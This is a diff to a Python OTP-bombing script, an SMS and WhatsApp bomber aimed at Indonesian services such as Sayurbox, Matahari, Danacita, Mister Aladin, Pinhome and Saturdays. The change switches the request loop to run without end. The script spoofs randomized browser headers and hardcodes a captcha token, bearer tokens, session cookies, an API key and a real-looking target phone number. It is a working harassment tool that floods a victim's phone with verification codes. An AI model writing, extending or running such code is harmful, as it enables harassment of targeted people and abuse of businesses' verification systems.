@@ -48,12 +48,12 @@ def generate_sec_ch_ua_platform():
     return f"\"{random.choice(platforms)}\""
 
 inputNomer = argv[1]
-inputJumlah = int(argv[2])
 nomor_matahari = inputNomer.replace("+62", "0")
 nomor_mraladin = inputNomer.replace("+62", "")
-
+nomor_pinhome = inputNomer.replace("+62", "")
+nomor_saturdays = inputNomer.replace("+62", "")
 # Loop to send OTP requests
-for i in range(inputJumlah):
+while True:
     user_agent = generate_user_agent()
     # Sayurbox
     headers_sayurbox = {
@@ -78,20 +78,41 @@ for i in range(inputJumlah):
         "X-Sbox-Tenant": "b2c",
         "X-Supported-Delivery": "NEXTDAY,SAMEDAY,INSTANT"
     }
-    data_sayurbox = json.dumps({
-        "operationName": "generateOTP",
-        "variables": {
-            "destinationType": "whatsapp",
-            "identity": inputNomer
-        },
-        "query": "mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"
-    })
-    response_sayurbox = requests.post("https://www.sayurbox.com/graphql/v1?deduplicate=1", headers=headers_sayurbox, data=data_sayurbox)
-    if response_sayurbox.status_code == 200:
-        print(f"{G}Berhasil mengirim SMS/WA via SayurBox")
-    else:
-        print(f"{R}Gagal mengirim SMS/WA via SayurBox")
+    def send_whatsapp_request(phone_number):
+        data_whatsapp_sayurbox = json.dumps({
+            "operationName": "generateOTP",
+            "variables": {
+                "destinationType": "whatsapp",
+                "identity": phone_number
+            },
+            "query": "mutation generateOTP($destinationType:String!$identity:String!){generateOTP(destinationType:$destinationType identity:$identity){id __typename}}"
+        })
+        response_danacita_whatsapp = requests.post("https://www.sayurbox.com/graphql/v1", headers=headers_sayurbox, data=data_whatsapp_sayurbox)
+        if response_danacita_whatsapp.status_code == 200:
+            result = response_danacita_whatsapp.json()
+            print(f"{hijau}Berhasil mengirim Whatsapp via SayurBox {result}")
+        else:
+            print(f"{R}Gagal mengirim Whatsapp via SayurBox {response_danacita_whatsapp.status_code}: {response_danacita_whatsapp.text}")
 
+# Function to send SMS request
+    def send_sms_request(phone_number):
+        data_sms_sayurbox = json.dumps({
+            "operationName": "generateOTP",
+            "variables": {
+                "destinationType": "sms",
+                "identity": phone_number
+            },
+            "query": "mutation generateOTP($destinationType:String!$identity:String!){generateOTP(destinationType:$destinationType identity:$identity){id __typename}}"
+        })
+        response_danacita_sms = requests.post("https://www.sayurbox.com/graphql/v1", headers=headers_sayurbox, data=data_sms_sayurbox)
+        if response_danacita_sms.status_code == 200:
+            result = response_danacita_sms.json()
+            print(f"{hijau}Berhasil mengirim SMS via SayurBox {result}")
+        else:
+            print(f"{R}Gagal mengirim SMS via SayurBox {response_danacita_sms.status_code}: {response_danacita_sms.status_code}")
+        
+    send_sms_request(inputNomer)
+    send_whatsapp_request(inputNomer)
     # Matahari
     headers_matahari = {
         "Host": "www.matahari.com",
@@ -114,47 +135,19 @@ for i in range(inputJumlah):
     data_matahari = json.dumps({
         "otp_request": {
             "mobile_number": nomor_matahari,
-            "mobile_country_code": "+62"
+            "mobile_country_code": "+62",
+            "token": "03AFcWeA6rBTK9XFGU4xi5A77pGBqHOhy74Vr6XW4ImA5P5nGi2rqtenZw7MwqMYv6ob_5aE4IjvAuFoboquHgpLHfAPwFGmVKEqBFJP31zKdlcQE95_AFEFpgrUmxNdboOADrHlHzJ98FePusoeEBP6GFedK-QoS7jjH6bygY38NdZ9mBlWqZzke13BN187QnP0kCiWDHPA5gspOHAA9N3zjxlsADcTqvabObXVZX6-2MjY_EZkZjNIc7B3LYQs5LTJHrFQOZKOKYeOO4EAXHBFGtUFzOVlAr7u2fp0obElm5PYyFKo71X_hlkM7zqG3ubwAy2RS8W5dUE5bHoaQ-8avw2Kozzykdcq8FMo0gIIIFEd7rM5wl689fAaUrohWNRwjONdeybL9YiapZ8oz81nXg6raaS7kYD07UQfjDv_xRw9XbpXwLxGLWoJDllawnbOm-TNKRREoy4qFZXQyh5k-xvMPWF2uReXsQlIZ7hlu_RjR8bSlc5WrA48nZDWS3A_K45nmUrihKw6FNG4WuaXEygNXv_gLl4GwloRKS1F_5SG6vKSYgXf2RqOrd_CO1f7T506fyvPtp9opDbZ9pjmHYdx583RvKrNVdnPYwu-qf69h53IKlpu7QlRH47RyAVJo0EExX9C9N4yRRQ8BSNCm8YAIpHgS8Yua21JeAvElQ6pV4nX_9aVjgwdcmU5sJKbAD9uvPUVk7ch5yqHmqQkPYeDoIMIre0ANhf6xqpd6PCVWmxqhEiHvMiK14E14inoxrjDpO7SSbimOCUJJGgAlZzp6XLOJLn1aJtyO34Cn4OWnm3UBKdHcBRUVAvQdRQ5NioV2yTv6hb2Qghc57_8rd4TDj8qniQuqWPPzzFnFkvdynEL1p9TVXJIuS0ZI20tIzGYqTZq4aissCsXXCsHzLBBVDkjdmZBRBbvR2Lv9jX6KavlBQ-X11dkBSPpYramyd24TglU4hiyYNipwmaw6lZlnTAxXkB3Av5ulh-Az39hG8fEOuoiQLnFRlpi_iH8nnooRqQNCsqyzRJ0SQ8cIsMcnsUDYvX9nzi5yccagMK6t-d5HL7353BCeFHSVWrKmcCJEEgacG3ka2-Aa9zj-MNJ6FAuioj0veQsqSpCw4Ug96bao3U3-M1VzG74NGrP9qul7kqhZ_A6htqiROsfgwSFYpviTTkGiqevRaKN3cuWlcPSdXqEyT72t-D07WHVzkmUJEtJ5sMUmYKPN2zCVog9manf757D1L0VC_bJnomu5_q9CEAW_g4b9dNnSCIiDWX4hw_ynMy1Qo37PYyb-1kkfQ9k2GTPGsdjc4bW53WdP4VkqbKuwdaIMCnSb8_hN-OyhUZJALXL0Hfc5gX_sC4d3aTKnrKp-Kp8u9_Gb4M0J7bDVPNiTEOO4v1iOtNJVD204DKhB0Ov3N5snWVLzAriErO48mAAU3la0xkeUEz53_CgCGCvZfDD8M8xV1uwsBkMvTcrv9smE4TLdB1u5q9kujmLfXOa9mIDlo2hxLbZsWjEwPWT4T23Ml7gecxrA6PEok3EAvJhyKm92bFZGLimRvXIc1TpTXMw4ZVpT_48ZBjCoN_W0joEL_AX0LDrp26X917_NtCyZyZiaYS05Qyd62oAK8oT0agNNs-HbjqgRMbYo_3RaxvDm2y3hn0zK2vfjoqECXncNSU5XDLjnvuf14KiCqaV4d3Y0znT_H_OgVeYo-usy25Nsw_ci58TWItD50VI9RZliM8FwtvglwMT36RFCCIdQzQcWsYGcYs-BQuDVYUDM"
         }
     })
     response_matahari = requests.post("https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp", headers=headers_matahari, data=data_matahari)
     if response_matahari.status_code == 200:
-        print(f"{G}Berhasil mengirim SMS/WA via Matahari")
+        response_data = response_matahari.json()
+        outcome_code = response_data.get("outcome_code")
+        outcome_message = response_data.get("outcome_message")
+        print(f"{hijau}Berhasil mengirim SMS/WA via Matahari {outcome_code}: {outcome_message}")
     else:
-        print(f"{R}Gagal mengirim SMS/WA via Matahari")
+        print(f"{R}Gagal mengirim SMS/WA via Matahari {response_matahari.status_code}: {response_matahari.text}")
 
-    # BukuWarung
-    headers_bukuwarung = {
-        "Host": "api-v2.bukuwarung.com",
-        "content-length": str(random.randint(20, 50)), 
-        "sec-ch-ua-mobile": f"?{random.randint(0, 1)}",
-        "user-agent": user_agent,
-        "content-type": "application/json",
-        "x-app-version-name": "android",
-        "accept": "application/json, text/plain, */*",
-        "x-app-version-code": "3001",
-        "buku-origin": "tokoko-web",
-        "sec-ch-ua-platform": generate_sec_ch_ua_platform(),
-        "origin": "https://tokoko.id",
-        "sec-fetch-site": random.choice(["same-site", "same-origin", "cross-site"]),
-        "sec-fetch-mode": random.choice(["cors", "navigate", "no-cors"]),
-        "sec-fetch-dest": random.choice(["empty", "document", "iframe"]),
-        "accept-encoding": "gzip, deflate, br",
-        "accept-language": generate_accept_language()
-    }
-    data_bukuwarung = json.dumps({
-        "operationName": "sendVerification",
-        "variables": {
-            "phone": inputNomer
-        },
-        "query": "mutation sendVerification($phone: String!) {\n  sendVerification(phone: $phone) {\n    success\n    errors\n  }\n}"
-    })
-    response_bukuwarung = requests.post("https://api-v2.bukuwarung.com/graphql", headers=headers_bukuwarung, data=data_bukuwarung)
-    if response_bukuwarung.status_code == 200:
-        print(f"{G}Berhasil mengirim SMS/WA via BukuWarung")
-    else:
-        print(f"{R}Gagal mengirim SMS/WA via BukuWarung")
-        
     headers_danacita = {
         "Accept": "application/json, text/plain, */*",
         "Accept-Encoding": "gzip, deflate, br, zstd",
@@ -180,39 +173,11 @@ for i in range(inputJumlah):
     
     response_danacita = requests.post("https://api.danacita.co.id/v4/users/mobile_register/", headers=headers_danacita, data=data_danacita)
     if response_danacita.status_code == 200:
-        print(f"{G}Berhasil mengirim SMS/WA via Danacita")
+        response_data = response_danacita.json()
+        detail = response_data.get("detail")
+        print(f"{hijau}Berhasil mengirim SMS/WA via Danacita {detail}")
     else:
-        print(f"{R}Gagal mengirim SMS/WA via Danacita")
-        
-    headers_harvest = {
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-		"Accept-Encoding": "gzip, deflate, br, zstd",
-		"Accept-Language": generate_accept_language(),
-		"Cache-Control": "max-age=0",
-		"Content-Type": "application/x-www-form-urlencoded",
-		"Cookie": "csrftoken=KdP64VLyAiPT85WSG8bV812VsmXHa4LIQHk9u9l0v0K7SX0VjKmKarzSEypuCeuh; _gid=GA1.2.1605440401.1718977455; _ga_S87G2283KK=GS1.1.1718982268.2.0.1718982268.0.0.0; _ga_K2VKG4DW9K=GS1.1.1718982268.2.0.1718982268.0.0.0; _ga=GA1.2.1215605141.1718977455; _gat_gtag_UA_234451190_1=1",
-		"Origin": "https://harvestcakes.com",
-		"Referer": "https://harvestcakes.com/register/",
-		"Sec-Ch-Ua": generate_sec_ch_ua(),
-		"Sec-Ch-Ua-Mobile": f"?{random.randint(0, 1)}",
-		"Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
-		"Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
-		"Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
-		"Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
-		"Sec-Fetch-User": "?1",
-		"Upgrade-Insecure-Requests": "1",
-		"User-Agent": user_agent
-	}
-    
-    data_harvest = json.dumps({
-        "phone": inputNomer
-	})
-    
-    response_harvest = requests.post("https://harvestcakes.com/register", headers=headers_harvest, data=data_harvest)
-    if response_harvest.status_code == 200:
-        print(f"{G}Berhasil mengirim SMS/WA via Harvest")
-    else:
-        print(f"{R}Gagal mengirim SMS/WA via Harvest")
+        print(f"{R}Gagal mengirim SMS/WA via Danacita {response_danacita.status_code}: {response_danacita.text}")
         
     headers_misterAladin = {
         "Accept": "application/json, text/plain, */*",
@@ -243,8 +208,104 @@ for i in range(inputJumlah):
     
     response_mraladin = requests.post("https://www.misteraladin.com/api/members/v2/otp/request", headers=headers_misterAladin, data=data_misterAladin)
     if response_mraladin.status_code == 200:
-        print(f"{G}Berhasil mengirim SMS/WA via Mister Aladin")
-    else: 
-        print(f"{R}Gagal mengirim SMS/WA via Mister Aladin")
-
+        response_data = response_mraladin.json()
     
+        data = response_data.get("data", {})
+        print("ID:", data.get("id"))
+        print("Member ID:", data.get("member_id"))
+        print("Phone Number Country Code:", data.get("phone_number_country_code"))
+        print("Phone Number:", data.get("phone_number"))
+        print("Type:", data.get("type"))
+        print("OTP Index:", data.get("otp_index"))
+        print("Expired At:", data.get("expired_at"))
+        print("Expire In Timestamp:", data.get("expire_in_timestamp"))
+        print("Blocked End:", data.get("blocked_end"))
+        print("Next Interval:", data.get("next_interval"))
+        print("Created At:", data.get("created_at"))
+        print("Updated At:", data.get("updated_at"))
+        print(f"{hijau}Berhasil mengirim SMS/WA via Mister Aladin")
+    else: 
+        print(f"{R}Gagal mengirim SMS/WA via Mister Aladin {response_mraladin.status_code} {response_mraladin.text}")
+
+    #pinhome
+    headers_pinhome = {
+        "Accept": "application/json",
+        "Accept-Encoding": "gzip, deflate, br, zstd",
+        "Accept-Language": generate_accept_language(),
+        "Authorization": "Bearer 13d2886acc908192d0c33325b44a617e5e3395481cc03cbfd67de34886399731",
+        "Content-Length": str(random.randint(20, 50)),
+        "Content-Type": "application/json",
+        "Cookie": "_gcl_au=1.1.246269231.1718959212; _fbp=fb.1.1718959212234.210660632162219433; _gcl_au=1.1.246269231.1718959212; _ga=GA1.1.127919491.1718959212; _fbp=fb.1.1718959212234.210660632162219433; _ga_CYRVZ1HEXG=GS1.1.1718959211.1.0.1718959212.0.0.0; _hhcftd=1618a140204983c645ecd5c7e4f60381cdecf115; _clck=1iujwii%7C2%7Cfmv%7C0%7C1633; _clsk=hty05m%7C1719102661534%7C1%7C1%7Ch.clarity.ms%2Fcollect; ph_phc_vIu9D3s1qIMPGaAkpBsgyBhRUFKtuyS7qUqeo35W873_posthog=%7B%22distinct_id%22%3A%22019039f4-0639-73c4-bba9-8c71ae7a0b93%22%2C%22%24sesid%22%3A%5B1719102662482%2C%2201904280-df2e-7d49-b1ac-8ece3e8cb4fd%22%2C1719102660398%5D%7D; _gid=GA1.2.275863447.1719102663; _ga_Y1EHRSKVLJ=GS1.1.1719102663.1.0.1719102663.60.0.0; _ga=GA1.2.127919491.1718959212; _ga_CYRVZ1HEXG=GS1.1.1719102660.2.1.1719102667.0.0.0",
+        "Origin": "https://www.pinhome.id",
+        "Priority": "u=1, i",
+        "Referer": "https://www.pinhome.id/daftar",
+        "Sec-Ch-Ua": generate_sec_ch_ua(),
+        "Sec-Ch-Ua-Mobile": f"?{random.randint(0, 1)}",
+        "Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
+        "Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
+        "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
+        "Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
+        "User-Agent": generate_user_agent(),
+        "X-Auth": "Bearer 63cb746000e1f88adaede0b65928daecac1914832d5fb20538209a76ae1754ea"
+    }
+    
+    data_pinhome = json.dumps({
+        "accountType": "customers",
+        "countryCode": "62",
+        "medium": "whatsapp",
+        "otpType": "register",
+        "phoneNumber": "81281524356"
+    })
+    
+    response_pinhome = requests.post("https://www.pinhome.id/api/pinaccount/request/otp", headers=headers_pinhome, data=data_pinhome)
+    if response_pinhome.status_code == 201:
+        response_data = response_pinhome.json()
+    
+        print("Secret Code:", response_data.get("secretCode"))
+        print(f"{hijau}Berhasil mengirim SMS/WA via Pinhome")
+    else:
+        print(f"{R}Gagal mengirim SMS/WA via Pinhome {response_pinhome.status_code} {response_pinhome.text}")
+        
+        
+    headers_saturdays = {
+        "Accept": "*/*",
+        "Accept-Encoding": "gzip, deflate, br, zstd",
+        "Accept-Language": "en",
+        "Authorization": "undefined", 
+        "Connection": "keep-alive",
+        "Content-Length": "55",
+        "Content-Type": "application/json",
+        "Country-Code": "ID",
+        "Currency-Code": "IDR",
+        "Device-Type": "dweb",
+        "Host": "beta.api.saturdays.com",
+        "Origin": "https://saturdays.com",
+        "Platform": "dweb",
+        "Referer": "https://saturdays.com/",
+        "Sec-Ch-Ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
+        "Sec-Ch-Ua-Mobile": "?0",
+        "Sec-Ch-Ua-Platform": "\"Windows\"",
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-site",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+        "X-Api-Key": "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj"
+    }
+
+    data_saturdays = json.dumps({
+        "number": "81281524356",
+        "countryCode": "+62",
+        "type": ""
+    })
+    
+    response_saturdays = requests.post("https://beta.api.saturdays.com/api/v1/user/otp/send", headers=headers_saturdays, data=data_saturdays)
+    if response_saturdays.status_code == 200:
+        response_data = response_saturdays.json()
+    
+        print("Status:", response_data.get("status"))
+        print("Data:", response_data.get("data"))
+        print("Message (EN):", response_data.get("message").get("en"))
+        print("Message (ID):", response_data.get("message").get("id"))
+        print(f"{hijau}Berhasil mengirim SMS/WA via Saturdays")
+    else:
+        print(f"{R}Gagal mengirim SMS/WA via Saturdays {response_saturdays.status_code} {response_saturdays.text}")
